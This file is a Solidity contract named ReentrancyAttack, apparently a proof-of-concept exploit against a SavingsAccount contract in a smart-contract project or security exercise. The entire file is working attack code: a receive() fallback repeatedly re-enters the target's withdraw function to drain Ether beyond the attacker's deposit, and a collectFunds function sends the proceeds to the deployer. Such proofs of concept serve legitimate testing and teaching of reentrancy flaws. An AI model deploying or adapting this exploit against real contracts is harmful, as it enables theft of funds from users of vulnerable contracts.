// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/SavingsAccount.sol";

contract ReentrancyAttack {
    SavingsAccount public savingsAccount;
    address public owner;
    uint256 public reentrancyCount;

    constructor(SavingsAccount _savingsAccount) {
        savingsAccount = _savingsAccount;
        owner = msg.sender;
    }

    // Fallback function to receive Ether and re-enter the withdraw function
    receive() external payable {
        // Check if the savings account still has enough balance for re-entrancy
        uint256 savingsAccountBalance = address(savingsAccount).balance;
        
        if (reentrancyCount < 5 && savingsAccountBalance >= 50 ether) {
            reentrancyCount++;
            savingsAccount.withdraw(50 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 150 ether, "Not enough Ether sent for attack");

        // Deposit sufficient funds to be eligible for the bonus
        savingsAccount.deposit{value: msg.value}();

        // Initiate withdrawal to trigger reentrancy
        savingsAccount.withdraw(50 ether);
    }

    function collectFunds() external {
        require(msg.sender == owner, "Only owner can collect funds");
        payable(owner).transfer(address(this).balance);
    }
}
